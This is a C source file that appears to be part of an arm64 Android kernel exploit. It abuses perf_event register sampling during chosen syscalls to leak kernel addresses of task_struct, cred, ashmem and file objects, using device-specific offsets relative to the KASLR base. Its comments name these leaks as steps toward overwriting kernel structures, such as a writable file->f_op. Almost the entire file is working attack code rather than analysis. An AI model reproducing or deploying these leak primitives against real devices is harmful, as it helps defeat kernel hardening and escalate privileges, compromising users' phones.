#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/perf_event.h>

#include "common.h"

uint64_t dbg_ips[6];
uint64_t dbg_cands[6];
uint64_t dbg_all[33];
#define PERF_LEAK_MAX 8192
static uint64_t pl_vals[PERF_LEAK_MAX];
static uint64_t pl_alt[8];
static int pl_n;

static void pl_add(uint64_t v) {
  if (v < 0xffffff8000000000ULL) return;
  if (pl_n < PERF_LEAK_MAX) pl_vals[pl_n++] = v;
}

/* Sample the kernel register state of *this* thread while it is inside short
 * syscalls.  In kernel mode arm64 keeps current in sp_el0, but every syscall
 * wrapper loads it into a general register, so a few hundred samples give the
 * task_struct address as the most frequently seen linear-map pointer. */
uintptr_t perf_regs_task_leak(void) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 100;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL; /* x0..x30, sp, pc */
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) {
    pr_error("task leak: perf_event_open regs failed errno=%d\n", errno);
    return 0;
  }
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) {
    pr_error("task leak: mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  for (int i = 0; i < 200000; i++) {
    syscall(SYS_getpid);
    syscall(SYS_gettid);
    syscall(SYS_getppid);
    syscall(SYS_getuid);
    syscall(SYS_getgid);
    syscall(SYS_geteuid);
  }
  uint64_t head = meta->data_head;
  __sync_synchronize();
  uint64_t tail = meta->data_tail;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  int nregs = 33, samp = 0;
  while (tail < head && samp < 20000) {
    unsigned char *p = data + (tail & mask);
    struct perf_event_header h;
    memcpy(&h, p, sizeof(h));
    if (h.size < sizeof(h) || h.size > 4096) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      size_t o = sizeof(h) + 8 /* ip */ + 8 /* abi */;
      for (int r = 0; r < nregs; r++) {
        uint64_t v = 0;
        memcpy(&v, p + o, 8);
        o += 8;
        pl_add(v);
      }
      samp++;
    }
    tail += h.size;
  }
  meta->data_tail = tail;
  munmap(map, len);
  close(fd);
  if (!pl_n) {
    pr_error("task leak: no samples\n");
    return 0;
  }
  /* pick the most frequent value that could be a task_struct: SLUB aligns
   * these objects to the 64-byte cache line, so drop anything not 0x40
   * aligned (that filters out vmap/stack and seq_file style pointers which
   * otherwise win the frequency contest on some boots). */
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    /* task_struct slab (measured on device): objsize 0x1040, 7 objects per
     * 32K slab, slab_base 32K aligned -> addr & 0x7fff is a multiple of
     * 0x1040. This is a much sharper filter than cache-line alignment. */
    if ((pl_vals[i] & 0x7fff) % 0x1040 != 0) continue;
    int n = 0;
    for (int j = 0; j < pl_n; j++) {
      if (pl_vals[j] == pl_vals[i]) n++;
    }
    if (n > bestn) {
      bestn = n;
      best = pl_vals[i];
    }
  }
  if (!best) {
    for (int i = 0; i < pl_n; i++) {
      int n = 0;
      for (int j = 0; j < pl_n; j++) {
        if (pl_vals[j] == pl_vals[i]) n++;
      }
      if (n > bestn) {
        bestn = n;
        best = pl_vals[i];
      }
    }
  }
  pr_info("task leak: samples=%d cands=%d best=%016zx hits=%d\n",
          samp, pl_n, (size_t)best, bestn);
  /* log the top distinct frequent values for judging */
  for (int k = 0; k < 8; k++) {
    uint64_t bv = 0;
    int bn = 0;
    for (int i = 0; i < pl_n; i++) {
      int n = 0;
      for (int j = 0; j < pl_n; j++) {
        if (pl_vals[j] == pl_vals[i]) n++;
      }
      int skip = 0;
      for (int q = 0; q < k; q++) {
        if (pl_vals[i] == pl_alt[q]) skip = 1;
      }
      if (!skip && n > bn) {
        bn = n;
        bv = pl_vals[i];
      }
    }
    if (!bv) break;
    pl_alt[k] = bv;
    pr_info("task leak: top[%d]=%016zx hits=%d\n", k, (size_t)bv, bn);
  }
  return (uintptr_t)best;
}

/* Deterministic cred leak: sample GPRs while calling setpriority(2) with a
 * negative nice value.  That fails but goes through can_nice() ->
 * capable(CAP_SYS_NICE) -> security_capable() -> cap_capable(), whose first
 * argument (x0) *is* the cred and stays live for the whole function
 * (0x49b9c0..0x49ba24: ldr x9,[x0,#0x88] ... ldr w9,[x0,#0x14]).  So for
 * every sample whose IP falls inside cap_capable(), x0 is the cred. */
uintptr_t perf_regs_cred_leak(uintptr_t task) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 50;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL;
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) {
    pr_error("cred leak: perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) { close(fd); return 0; }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  pl_n = 0;
  extern uint64_t kaslr_base;
  uint64_t cclo = kaslr_base + 0x49b9c0;
  uint64_t cchi = cclo + 0x100;
  int sp1 = 1;
  for (int i = 0; i < 300000; i++) {
    /* SCHED_FIFO always needs CAP_SYS_NICE -> __sched_setscheduler ->
     * capable() -> security_capable() -> cap_capable(current_cred(),...) */
    syscall(SYS_sched_setscheduler, 0, 1 /* SCHED_FIFO */, &sp1);
    syscall(SYS_getpid);
    syscall(SYS_getuid);
  }
  uint64_t head = meta->data_head;
  __sync_synchronize();
  uint64_t tail = meta->data_tail;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  int nregs = 33, samp = 0, inrange = 0;
  while (tail < head && samp < 20000) {
    unsigned char *p = data + (tail & mask);
    struct perf_event_header h;
    memcpy(&h, p, sizeof(h));
    if (h.size < sizeof(h) || h.size > 4096) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t ip = 0;
      memcpy(&ip, p + sizeof(h), 8);
      size_t o = sizeof(h) + 8 + 8;
      uint64_t x0 = 0;
      memcpy(&x0, p + o, 8);
      o += 8 * nregs;
      if (ip >= cclo && ip < cchi) {
        inrange++;
        if (x0 >= 0xffffffc000000000ULL && (x0 & 0xfff) % 0xc0 == 0) {
          pl_add(x0);
        }
      }
      samp++;
    }
    tail += h.size;
  }
  meta->data_tail = tail;
  munmap(map, len);
  close(fd);
  if (!pl_n) {
    pr_error("cred leak: no candidates (samples=%d ip_in_cap_capable=%d)\n",
             samp, inrange);
    return 0;
  }
  if (pl_n < 3) {
    pr_error("cred leak: only %d hits, not trusting it\n", pl_n);
    return 0;
  }
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    int n = 0;
    for (int j = 0; j < pl_n; j++) {
      if (pl_vals[j] == pl_vals[i]) n++;
    }
    if (n > bestn) { bestn = n; best = pl_vals[i]; }
  }
  pr_info("cred leak: samples=%d cands=%d best=%016zx hits=%d\n",
          samp, pl_n, (size_t)best, bestn);
  for (int k = 0; k < 6; k++) {
    uint64_t bv = 0;
    int bn = 0;
    for (int i = 0; i < pl_n; i++) {
      int n = 0;
      for (int j = 0; j < pl_n; j++) {
        if (pl_vals[j] == pl_vals[i]) n++;
      }
      int skip = 0;
      for (int q = 0; q < k; q++) if (pl_vals[i] == pl_alt[q]) skip = 1;
      if (!skip && n > bn) { bn = n; bv = pl_vals[i]; }
    }
    if (!bv) break;
    pl_alt[k] = bv;
    pr_info("cred leak: top[%d]=%016zx hits=%d\n", k, (size_t)bv, bn);
  }
  return (uintptr_t)best;
}


/* Deterministic task_struct leak: sample GPRs while calling
 * sched_setscheduler(0, SCHED_FIFO, ...).  For pid 0 the kernel resolves the
 * target to current and calls __sched_setscheduler(p = current, ...), whose
 * first argument is exactly our task_struct:
 *   0x89988: sub sp,sp,#0xa0
 *   ...
 *   0x899b4: mov x19, x0        ; p moves to x19 and stays there
 * So samples with IP in [0x89988,0x899b4) give x0, samples right after give
 * x19 - both are the task_struct. */
uintptr_t perf_task_from_sched(void) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 50;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL;
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) { pr_error("task sched leak: perf open errno=%d\n", errno); return 0; }
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) { close(fd); return 0; }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  extern uint64_t kaslr_base;
  uint64_t lo = kaslr_base + 0x89988;
  uint64_t mid = kaslr_base + 0x899b4;
  uint64_t hi = mid + 0x300;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  uint64_t tail = meta->data_tail;
  int samp = 0, inrange = 0;
  pl_n = 0;
  /* The perf ring holds only ~900 of these samples, so it must be drained
   * while the loop runs - otherwise every sample of interest is overwritten
   * long before the loop ends (that is why the hit count used to be 0..14). */
#define PL_DRAIN()                                                            do {                                                                          uint64_t head = meta->data_head;                                            __sync_synchronize();                                                       while (tail < head) {                                                         unsigned char *p = data + (tail & mask);                                    struct perf_event_header h;                                                 memcpy(&h, p, sizeof(h));                                                   if (h.size < sizeof(h) || h.size > 4096) break;                             if (h.type == PERF_RECORD_SAMPLE) {                                           uint64_t ip = 0;                                                            memcpy(&ip, p + sizeof(h), 8);                                              size_t o = sizeof(h) + 16;                                                  uint64_t cand = 0;                                                          if (ip >= lo && ip < mid) {                                                   memcpy(&cand, p + o + 0 * 8, 8);                                          } else if (ip >= mid && ip < hi) {                                            memcpy(&cand, p + o + 19 * 8, 8);                                         }                                                                           if (cand) {                                                                   inrange++;                                                                  if (cand >= 0xffffffc000000000ULL &&                                            (cand & 0x7fff) % 0x1040 == 0) {                                          pl_add(cand);                                                             }                                                                         }                                                                           samp++;                                                                   }                                                                           tail += h.size;                                                           }                                                                           meta->data_tail = tail;                                                   } while (0)
  int sp1 = 1;
  for (int i = 0; i < 400000; i++) {
    syscall(SYS_sched_setscheduler, 0, 1 /* SCHED_FIFO */, &sp1);
    syscall(SYS_getpid);
    if ((i & 255) == 255) {
      PL_DRAIN();
    }
  }
  PL_DRAIN();
#undef PL_DRAIN
  munmap(map, len);
  close(fd);
  pr_info("task sched leak: samples=%d inrange=%d cands=%d\n", samp, inrange, pl_n);
  if (!pl_n || pl_n < 3) return 0;
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    int n = 0;
    for (int j = 0; j < pl_n; j++) if (pl_vals[j] == pl_vals[i]) n++;
    if (n > bestn) { bestn = n; best = pl_vals[i]; }
  }
  pr_info("task sched leak: best=%016zx hits=%d\n", (size_t)best, bestn);
  return (uintptr_t)best;
}

/* Deterministic ashmem_area leak.  ashmem_ioctl does
 *     ldr x19, [x0, #0xd8]      ; file->private_data == struct ashmem_area *
 * at +0x3c and keeps it in x19 for the whole function, so any perf sample
 * taken inside ashmem_ioctl after that point carries asma in x19.  The object
 * comes from the kmalloc-512 cache, hence the 0x100-alignment filter. */

/* Cross-check leak: ashmem_mmap loads file->private_data into x23 at
 *   00dbc1b4: ldr x23, [x0, #0xd8]
 * so sampling inside ashmem_mmap gives the same ashma from another entry
 * point.  Returns the most frequent kernel pointer in x23. */
uintptr_t perf_regs_asma_leak_mmap(int afd) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 50;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL;
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) { pr_error("asma mmap leak: perf open errno=%d\n", errno); return 0; }
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) { close(fd); return 0; }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  uint64_t tail = meta->data_tail;
  int samp = 0, inrange = 0;
  pl_n = 0;
  extern uint64_t kaslr_base;
  uint64_t lo = kaslr_base + ASHMEM_MMAP_OFF + 0x14;
  uint64_t hi = kaslr_base + ASHMEM_MMAP_OFF + 0x150;
#define PL_DRAIN_MMAP()                                                     \
  do {                                                                      \
    uint64_t head = meta->data_head;                                        \
    __sync_synchronize();                                                   \
    while (tail < head) {                                                   \
      unsigned char *p = data + (tail & mask);                              \
      struct perf_event_header h;                                           \
      memcpy(&h, p, sizeof(h));                                             \
      if (h.size < sizeof(h) || h.size > 4096) break;                       \
      if (h.type == PERF_RECORD_SAMPLE) {                                   \
        uint64_t ip = 0;                                                    \
        memcpy(&ip, p + sizeof(h), 8);                                      \
        if (ip >= lo && ip < hi) {                                          \
          size_t o = sizeof(h) + 16;                                        \
          uint64_t cand = 0;                                                \
          memcpy(&cand, p + o + 23 * 8, 8);                                 \
          if (cand >= 0xffffff8000000000ULL && (cand & 7) == 0) {           \
            inrange++;                                                      \
            pl_add(cand);                                                   \
          }                                                                 \
        }                                                                   \
        samp++;                                                             \
      }                                                                     \
      tail += h.size;                                                       \
    }                                                                       \
    meta->data_tail = tail;                                                 \
  } while (0)
  for (int i = 0; i < 120000; i++) {
    void *p = mmap(NULL, 4096, PROT_READ, MAP_SHARED, afd, 0);
    if (p != MAP_FAILED) munmap(p, 4096);
    if ((i & 63) == 63) PL_DRAIN_MMAP();
  }
  PL_DRAIN_MMAP();
#undef PL_DRAIN_MMAP
  munmap(map, len);
  close(fd);
  pr_info("asma mmap leak: samples=%d inrange=%d cands=%d\n", samp, inrange, pl_n);
  if (!pl_n || pl_n < 3) return 0;
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    int n = 0;
    for (int j = 0; j < pl_n; j++) if (pl_vals[j] == pl_vals[i]) n++;
    if (n > bestn) { bestn = n; best = pl_vals[i]; }
  }
  pr_info("asma mmap leak: best=%016zx hits=%d\n", (size_t)best, bestn);
  return (uintptr_t)best;
}

/* Same sampling window as the ashma leak, but returns the *file* pointer that
 * ashmem_ioctl keeps in x0 (the first argument).  That is a heap object, so
 * file->f_op (offset 0x28) is writable - unlike ashmem_misc, which lives in
 * __ro_after_init on this device. */
/* Leak the struct file * of an arbitrary fd: sample x20 (== file) inside
 * __vfs_write while the caller writes to that fd.  A file opened O_RDWR on a
 * device whose fops has ->write keeps FMODE_CAN_WRITE, which vfs_write()
 * requires before dispatch; ashmem fds do not have it. */
uintptr_t perf_regs_file_write(int wfd) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 50;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL;
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) { pr_error("file write leak: perf open errno=%d\n", errno); return 0; }
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) { close(fd); return 0; }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  uint64_t tail = meta->data_tail;
  int samp = 0, inrange = 0;
  pl_n = 0;
  extern uint64_t kaslr_base;
  uint64_t lo = kaslr_base + __VFS_WRITE_OFF + 0x20;
  uint64_t hi = kaslr_base + __VFS_WRITE_OFF + 0x2c0;
#define PL_DRAIN_FW()                                                       \
  do {                                                                      \
    uint64_t head = meta->data_head;                                        \
    __sync_synchronize();                                                   \
    while (tail < head) {                                                   \
      unsigned char *p = data + (tail & mask);                              \
      struct perf_event_header h;                                           \
      memcpy(&h, p, sizeof(h));                                             \
      if (h.size < sizeof(h) || h.size > 4096) break;                       \
      if (h.type == PERF_RECORD_SAMPLE) {                                   \
        uint64_t ip = 0;                                                    \
        memcpy(&ip, p + sizeof(h), 8);                                      \
        if (ip >= lo && ip < hi) {                                          \
          size_t o = sizeof(h) + 16;                                        \
          uint64_t cand = 0;                                                \
          memcpy(&cand, p + o + 20 * 8, 8);                                 \
          if (cand >= 0xffffff8000000000ULL && (cand & 7) == 0) {           \
            inrange++;                                                      \
            pl_add(cand);                                                   \
          }                                                                 \
        }                                                                   \
        samp++;                                                             \
      }                                                                     \
      tail += h.size;                                                       \
    }                                                                       \
    meta->data_tail = tail;                                                 \
  } while (0)
  for (int i = 0; i < 200000; i++) {
    ssize_t w = write(wfd, "x", 1);
    (void)w;
    if ((i & 127) == 127) PL_DRAIN_FW();
  }
  PL_DRAIN_FW();
#undef PL_DRAIN_FW
  munmap(map, len);
  close(fd);
  pr_info("file write leak: samples=%d inrange=%d cands=%d\n", samp, inrange, pl_n);
  if (!pl_n || pl_n < 3) return 0;
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    int n = 0;
    for (int j = 0; j < pl_n; j++) if (pl_vals[j] == pl_vals[i]) n++;
    if (n > bestn) { bestn = n; best = pl_vals[i]; }
  }
  pr_info("file write leak: best=%016zx hits=%d\n", (size_t)best, bestn);
  return (uintptr_t)best;
}

uintptr_t perf_regs_ashmem_file(int afd) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 50;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL;
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) return 0;
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) { close(fd); return 0; }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  uint64_t tail = meta->data_tail;
  int samp = 0, inrange = 0;
  pl_n = 0;
  extern uint64_t kaslr_base;
  uint64_t lo = kaslr_base + ASHMEM_IOCTL_OFF + 0x40;
  uint64_t hi = kaslr_base + ASHMEM_IOCTL_OFF + 0x500;
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name) - 1);
  name[0] = 0x42;
  name[sizeof(name) - 1] = 0;
#define PL_DRAIN_FILE()                                                     \
  do {                                                                      \
    uint64_t head = meta->data_head;                                        \
    __sync_synchronize();                                                   \
    while (tail < head) {                                                   \
      unsigned char *p = data + (tail & mask);                              \
      struct perf_event_header h;                                           \
      memcpy(&h, p, sizeof(h));                                             \
      if (h.size < sizeof(h) || h.size > 4096) break;                       \
      if (h.type == PERF_RECORD_SAMPLE) {                                   \
        uint64_t ip = 0;                                                    \
        memcpy(&ip, p + sizeof(h), 8);                                      \
        if (ip >= lo && ip < hi) {                                          \
          size_t o = sizeof(h) + 16;                                        \
          uint64_t cand = 0;                                                \
          memcpy(&cand, p + o, 8);                                          \
          if (cand >= 0xffffff8000000000ULL && (cand & 7) == 0) {           \
            inrange++;                                                      \
            pl_add(cand);                                                   \
          }                                                                 \
        }                                                                   \
        samp++;                                                             \
      }                                                                     \
      tail += h.size;                                                       \
    }                                                                       \
    meta->data_tail = tail;                                                 \
  } while (0)
  for (int i = 0; i < 300000; i++) {
    ioctl(afd, ASHMEM_SET_NAME, name);
    if ((i & 127) == 127) PL_DRAIN_FILE();
  }
  PL_DRAIN_FILE();
#undef PL_DRAIN_FILE
  munmap(map, len);
  close(fd);
  pr_info("ashmem file leak: samples=%d inrange=%d cands=%d\n", samp, inrange, pl_n);
  if (!pl_n || pl_n < 3) return 0;
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    int n = 0;
    for (int j = 0; j < pl_n; j++) if (pl_vals[j] == pl_vals[i]) n++;
    if (n > bestn) { bestn = n; best = pl_vals[i]; }
  }
  pr_info("ashmem file leak: best=%016zx hits=%d\n", (size_t)best, bestn);
  return (uintptr_t)best;
}
uintptr_t perf_regs_asma_leak(int afd) {
  struct perf_event_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.type = PERF_TYPE_SOFTWARE;
  attr.config = PERF_COUNT_SW_CPU_CLOCK;
  attr.size = sizeof(attr);
  attr.sample_period = 50;
  attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = 0x1ffffffffULL;
  int fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) { pr_error("asma leak: perf open errno=%d\n", errno); return 0; }
  size_t pg = 4096, len = pg * 65;
  void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (map == MAP_FAILED) { close(fd); return 0; }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
  unsigned char *data = (unsigned char *)map + pg;
  size_t mask = meta->data_size - 1;
  uint64_t tail = meta->data_tail;
  int samp = 0, inrange = 0, near_ip = 0, dbg_kern = 0, dbg_cand_n = 0;
  extern uint64_t dbg_cands[6];
  pl_n = 0;
  extern uint64_t dbg_ips[6];
  extern uint64_t kaslr_base;
  uint64_t lo = kaslr_base + ASHMEM_IOCTL_OFF + 0x40;
  uint64_t hi = kaslr_base + ASHMEM_IOCTL_OFF + 0x500;
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name) - 1);
  name[sizeof(name) - 1] = 0;
#define PL_DRAIN_ASMA()                                                     \
  do {                                                                      \
    uint64_t head = meta->data_head;                                        \
    __sync_synchronize();                                                   \
    while (tail < head) {                                                   \
      unsigned char *p = data + (tail & mask);                              \
      struct perf_event_header h;                                           \
      memcpy(&h, p, sizeof(h));                                             \
      if (h.size < sizeof(h) || h.size > 4096) break;                       \
      if (h.type == PERF_RECORD_SAMPLE) {                                   \
        uint64_t ip = 0;                                                    \
        memcpy(&ip, p + sizeof(h), 8);                                      \
        if (ip >= lo && ip < hi) {                                          \
          size_t o = sizeof(h) + 16;                                        \
          uint64_t cand = 0;                                                \
          memcpy(&cand, p + o + 19 * 8, 8);                                 \
          if (dbg_cand_n < 1) {                                             \
            extern uint64_t dbg_cands[6];                                   \
            extern uint64_t dbg_all[33];                                    \
            dbg_cands[dbg_cand_n++] = cand;                                 \
            for (int r = 0; r < 33; r++) {                                  \
              memcpy(&dbg_all[r], p + o + r * 8, 8);                        \
            }                                                               \
          }                                                                 \
          if (ip >= 0xffffff8000000000ULL) {                                \
            if (dbg_kern < 6) {                                             \
              extern uint64_t dbg_ips[6];                                   \
              dbg_ips[dbg_kern++] = ip;                                     \
            }                                                               \
          }                                                                 \
          near_ip++;                                                        \
          if (cand >= 0xffffff8000000000ULL && (cand & 7) == 0) {           \
            inrange++;                                                      \
            pl_add(cand);                                                   \
          }                                                                 \
        }                                                                   \
        samp++;                                                             \
      }                                                                     \
      tail += h.size;                                                       \
    }                                                                       \
    meta->data_tail = tail;                                                 \
  } while (0)
  for (int i = 0; i < 300000; i++) {
    ioctl(afd, ASHMEM_SET_NAME, name);
    if ((i & 127) == 127) {
      PL_DRAIN_ASMA();
    }
  }
  PL_DRAIN_ASMA();
#undef PL_DRAIN_ASMA
  munmap(map, len);
  close(fd);
  pr_info("asma leak: samples=%d inrange=%d cands=%d kernIP=%d lo=%016zx ip0=%016zx ip1=%016zx ip2=%016zx\n",
          samp, inrange, pl_n, dbg_kern, (size_t)lo,
          (size_t)dbg_cands[0], (size_t)dbg_cands[1], (size_t)dbg_cands[2]);
  if (!pl_n || pl_n < 3) return 0;
  uint64_t best = 0;
  int bestn = 0;
  for (int i = 0; i < pl_n; i++) {
    int n = 0;
    for (int j = 0; j < pl_n; j++) if (pl_vals[j] == pl_vals[i]) n++;
    if (n > bestn) { bestn = n; best = pl_vals[i]; }
  }
  pr_info("asma leak: best=%016zx hits=%d\n", (size_t)best, bestn);
  {
    extern uint64_t dbg_all[33];
    for (int r = 0; r < 33; r += 4) {
      pr_info("asma regs[%02d..] %016zx %016zx %016zx %016zx\n", r,
              (size_t)dbg_all[r], (size_t)dbg_all[r + 1],
              (size_t)dbg_all[r + 2], (size_t)dbg_all[r + 3]);
    }
  }
  return (uintptr_t)best;
}


